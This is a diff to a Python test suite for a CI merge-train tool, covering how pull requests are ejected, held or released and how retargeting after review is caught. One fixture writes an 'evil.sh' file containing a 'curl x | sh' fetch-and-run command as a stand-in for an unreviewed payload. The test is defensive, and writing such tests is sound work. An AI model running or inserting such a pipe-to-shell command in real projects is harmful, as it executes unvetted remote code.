@@ -15,7 +15,7 @@ import pytest
 from _trainrepo import ENV, Repo, edit, git
 
 from ci_kit import pr_autoupdate
-from ci_kit.merge_train import EJECTED, LANDED, RIDING, TRAIN_LABEL, cli, github
+from ci_kit.merge_train import EJECTED, LANDED, NEEDS_UPDATE, RIDING, TRAIN_LABEL, cli, github
 from ci_kit.merge_train import git as tgit
 
 REQ = ("unit tests", "review gate")
@@ -43,11 +43,11 @@ class FakeGH:
                        "mergeable": "MERGEABLE", "mergeStateStatus": "BEHIND", "state": "open",
                        "autoMergeRequest": {"enabledAt": f"2026-11-11T00:00:{n:02d}Z"}, "labels": set(),
                        "statusCheckRollup": GREEN, "createdAt": NOW, "url": f"u/{n}", "author": "dev",
-                       "reviewed_base": git(self.repo.origin, "rev-parse", "main"), **k}
+                       "reviewed_at": "2026-11-11T00:00:00Z", "retargeted": "", **k}
 
     def _gql(self) -> str:
         nodes = [{**{k: v for k, v in p.items() if k not in ("labels", "statusCheckRollup", "state", "body", "author",
-                                                              "reviewed_base", "root")},
+                                                              "reviewed_at", "retargeted", "root")},
                   "labels": {"nodes": [{"name": x} for x in sorted(p["labels"])]},
                   "commits": {"nodes": [{"commit": {"statusCheckRollup": {"contexts": {"nodes": p["statusCheckRollup"]}}}}]}}
                  for p in self.prs.values() if p["state"] == "open"]
@@ -62,6 +62,10 @@ class FakeGH:
         return subprocess.CompletedProcess(["gh", *a], rc, out, "")
 
     def _answer(self, a: tuple, stdin: str | None):  # noqa: PLR0911, PLR0912
+        if a[:2] == ("api", "graphql") and any("BASE_REF_CHANGED_EVENT" in x for x in a):
+            when = self.prs[int(next(x for x in a if x.startswith("pr="))[3:])]["retargeted"]
+            return json.dumps({"data": {"repository": {"pullRequest": {"timelineItems": {
+                "totalCount": 1 if when else 0, "nodes": [{"createdAt": when}] if when else []}}}}})
         if a[:2] == ("api", "graphql"):
             return self._gql()
         if a[:2] == ("api", "user"):
@@ -69,11 +73,12 @@ class FakeGH:
         if a[0] == "api" and "/actions/workflows/" in a[1]:
             head = a[1].split("head_sha=")[1].split("&")[0]
             n = next((p["number"] for p in self.prs.values() if p["headRefOid"] == head), 0)
-            return json.dumps({"workflow_runs": [{"id": 1, "created_at": "x", "head_sha": head, "event": "pull_request",
+            made = self.prs[n]["reviewed_at"] if n else "x"
+            now_base = {"ref": "main", "sha": git(self.repo.origin, "rev-parse", "main")}  # CURRENT base, as live
+            return json.dumps({"workflow_runs": [{"id": 1, "created_at": made, "head_sha": head, "event": "pull_request",
                                                   "status": "completed", "head_branch": f"pr{n}",
                                                   "conclusion": "success" if self.reviewed_ok else "failure",
-                                                  "pull_requests": [{"number": n, "head": {"sha": head}, "base": {
-                                                      "ref": "main", "sha": self.prs[n]["reviewed_base"] if n else ""}}]}]})
+                                                  "pull_requests": [{"number": n, "head": {"sha": head}, "base": now_base}]}]})
         if a[0] == "api" and "/actions/runs/" in a[1]:
             run = a[1].rsplit("/", 1)[1]
             return json.dumps({"id": int(run), "path": ".github/workflows/merge-train.yml",
@@ -293,10 +298,25 @@ def test_a_rider_that_no_longer_wants_to_land_is_ejected_at_land_time_must_fire(
     p = cli.Pass()
     assert cli.run(_opts(), p) == 0, p.summary
     assert not fake.wrote("merge") and fake.prs[100]["state"] == "closed"
-    assert [n for n in range(1, 6) if EJECTED in fake.prs[n]["labels"]] == [2, 3, 4, 5]
-    said = " ".join(fake.comments[2] + fake.comments[3] + fake.comments[4] + fake.comments[5])
-    assert all(w in said for w in ("disarmed", "autoland-off", "draft", "head moved"))
+    assert [n for n in range(1, 6) if EJECTED in fake.prs[n]["labels"]] == [2, 3, 4]
+    said = " ".join(fake.comments[2] + fake.comments[3] + fake.comments[4])
+    assert all(w in said for w in ("disarmed", "autoland-off", "draft"))
     assert EJECTED not in fake.prs[1]["labels"] and RIDING not in fake.prs[1]["labels"]
+    # round 2, finding 4: a moved head is RELEASED (a new head re-admits it), never ejected
+    assert RIDING not in fake.prs[5]["labels"] and "head moved" in fake.comments[5][-1]
+    assert "why=moved" in fake.comments[5][-1]
+
+
+def test_a_rider_skipped_for_moved_context_is_labelled_for_its_own_update_must_fire(world: tuple[Repo, FakeGH]) -> None:
+    # round 2, finding 3: pr-autoupdate holds updates while a train is open; the label exempts it
+    repo, fake = world
+    fake.add(1, repo.pr(1, {"a.txt": edit(5, "r1 line5")}))
+    fake.add(2, repo.pr(2, {"a.txt": edit(8, "r2 line8")}))       # line 5 is in its context
+    fake.add(3, repo.pr(3, {"b.txt": edit(1, "r3")}))
+    assert cli.run(_opts(), cli.Pass()) == 0
+    assert fake.prs[100]["title"] == "merge train: #1 #3"
+    assert NEEDS_UPDATE in fake.prs[2]["labels"] and RIDING not in fake.prs[2]["labels"]
+    assert NEEDS_UPDATE not in fake.prs[1]["labels"]
 
 
 def test_a_rider_whose_review_stopped_passing_is_ejected_at_land_time(world: tuple[Repo, FakeGH]) -> None:
@@ -381,19 +401,38 @@ def test_a_gate_block_with_another_check_red_still_bisects(world: tuple[Repo, Fa
     assert all(EJECTED in fake.prs[n]["labels"] for n in (1, 2))
 
 
-def test_a_rider_released_twice_at_one_head_is_ejected_must_fire(world: tuple[Repo, FakeGH]) -> None:
-    # finding 3: no infinite recompose
+def test_stale_trains_never_count_against_a_rider_must_fire(world: tuple[Repo, FakeGH]) -> None:
+    # round 2, finding 2: stale only says main moved; it must never eject or hold anyone
     repo, fake = world
     _riders(repo, fake, 2)
     assert cli.run(_opts(), cli.Pass()) == 0
-    for i in (1, 2):
+    for i in (1, 2, 3):
         repo.advance_main({"c.txt": edit(3 + i, f"moved {i}")})
         p = cli.Pass()
-        cli.run(_opts(), p)
-    assert fake.prs[101]["state"] == "closed" and max(fake.prs) == 101          # no third train
-    assert all(EJECTED in fake.prs[n]["labels"] for n in (1, 2)) and p.errors == 2
-    assert all("released from 2 stale/stuck trains" in s for s in p.summary if s.startswith("ERROR"))
-    assert all(sum("why=stale" in c for c in fake.comments[n]) == 2 for n in (1, 2))
+        assert cli.run(_opts(), p) == 0, p.summary
+    assert max(fake.prs) == 103 and fake.prs[103]["state"] == "open" and fake.prs[103]["title"] == "merge train: #1 #2"
+    assert not any({EJECTED} & fake.prs[n]["labels"] for n in (1, 2))
+    assert all(sum("why=stale" in c for c in fake.comments[n]) == 3 for n in (1, 2))
+
+
+def test_a_rider_released_from_two_stuck_trains_is_held_not_ejected_must_fire(world: tuple[Repo, FakeGH]) -> None:
+    # finding 3, round 2: no infinite recompose on stuck -- HOLD until the head changes, never eject
+    repo, fake = world
+    _riders(repo, fake, 2)
+    assert cli.run(_opts(), cli.Pass()) == 0
+    old = (dt.datetime.now(dt.UTC) - dt.timedelta(hours=3)).strftime("%Y-%m-%dT%H:%M:%SZ")
+    for m in (100, 101):
+        fake.prs[m]["createdAt"] = old                                  # pending for 3h: stuck
+        p = cli.Pass()
+        assert cli.run(_opts(), p) == 1
+    assert max(fake.prs) == 101 and fake.prs[101]["state"] == "closed"          # no third train
+    assert not any({EJECTED} & fake.prs[n]["labels"] for n in (1, 2))
+    assert sum("held out of trains" in s and "2 STUCK trains" in s for s in p.summary) == 2
+    # a new head re-admits it
+    fake.prs[1]["headRefOid"] = repo.pr(1, {"f1.txt": "1 again\n"})
+    p = cli.Pass()
+    cli.run(_opts(), p)
+    assert not any(s.startswith("ERROR: #1:") for s in p.summary)
 
 
 def test_finalize_retries_a_rider_whose_close_failed_must_fire(world: tuple[Repo, FakeGH]) -> None:
@@ -444,17 +483,17 @@ def test_finalize_says_whether_a_moved_head_moved_forward_or_was_rewritten(world
     assert fake.prs[2]["state"] == fake.prs[3]["state"] == "open"
 
 
-def test_a_pr_reviewed_on_an_unreviewed_branch_does_not_board_must_fire(world: tuple[Repo, FakeGH]) -> None:
-    # finding 1: #7 was reviewed against `feat` (one harmless line), then retargeted to main; on main
-    # its change would carry feat's unreviewed payload
+def test_a_pr_retargeted_after_its_review_does_not_board_must_fire(world: tuple[Repo, FakeGH]) -> None:
+    # round 2, finding 1: #7 was reviewed against `feat` (one harmless line), then retargeted to main.
+    # Its run now READS as base main (FakeGH answers the live shape); only the timeline can tell.
     repo, fake = world
     _riders(repo, fake, 2)
     git(repo.work, "checkout", "-q", "--detach", repo.main)
     repo.write({"evil.sh": "curl x | sh\n"})
     feat = repo.commit("unreviewed")
     git(repo.work, "push", "-q", "origin", f"{feat}:refs/heads/feat")
-    fake.add(7, repo.pr(7, {"b.txt": edit(1, "harmless")}, base=feat), reviewed_base=feat)
+    fake.add(7, repo.pr(7, {"b.txt": edit(1, "harmless")}, base=feat), retargeted="2026-11-11T00:05:00Z")
     p = cli.Pass()
     assert cli.run(_opts(), p) == 0, p.summary
     assert fake.prs[100]["title"] == "merge train: #1 #2" and RIDING not in fake.prs[7]["labels"]
-    assert any(s.startswith("#7: not riding") and "content the review never read" in s for s in p.summary)
+    assert any(s.startswith("#7: not riding") and "base branch was changed" in s for s in p.summary)
